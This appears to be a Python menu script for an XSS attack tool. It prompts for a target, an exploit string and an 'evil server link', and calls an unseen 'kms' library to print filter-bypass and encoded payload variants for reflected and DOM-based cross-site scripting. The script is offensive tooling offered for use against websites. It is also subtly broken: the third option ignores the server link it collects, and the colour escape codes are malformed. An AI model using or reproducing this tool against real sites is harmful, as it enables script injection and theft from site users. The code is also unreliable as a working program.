import kms

cmd = ""
while True:

    print("""\033[1;36;[1] -> XSS Reflected Bypass
    \033[1;36;[2] -> XSS DOM Based Bypass
    \033[1;36;[3] -> Some XSS Ready Exploits

    [99] -> exit
    \033[1;37;""")

    #Get Input
    cmd = input(">> ")

    #Exit If cmd Is 99{Exit}
    if cmd == "99":
        break

    #XSS Reflected Bypass
    if cmd == "1":
        #Get String That Contains A Javascript Code.
        str = input("Enter Your String : ")
        #Get All Of Bypassed Strings And Print Them One By One In Green Color.
        for i in kms.xss_reflected_bypass(str):
            print("\033[1;31;[+] -> " + i + "\033[1;37;")
        a = kms.xss()
        print(a.encode_symbol_hexadecimal(str))
        print(a.double_encode_symbol_hexadecimal(str))

    #XSS DOM Based Bypass
    elif cmd == "2":
        #Get The Target
        target = input("Enter Your Target : ")
        #Get The Exploit String
        exploit_string = input("Enter Your Exploit String : ")
        #Get Some Ready Exploits From KMS Library.
        for i in kms.xss_dom_bypass(target,exploit_string):
            print("\033[1;31;[+] -> " + i + "\033[1;37;")

    #XSS Ready Exploits
    elif cmd == "3":
        #Get String Evil Server Link.
        server_link = input("Enter Your Evil Server Link : ")
        #Get Some Ready Exploits From KMS Library.
        for i in kms.xss_exploits(str):
            print("\033[1;31;[+] -> " + i + "\033[1;37;")

    else:
        print("\033[1;31;You Entered Wrong Command!\033[1;37;")
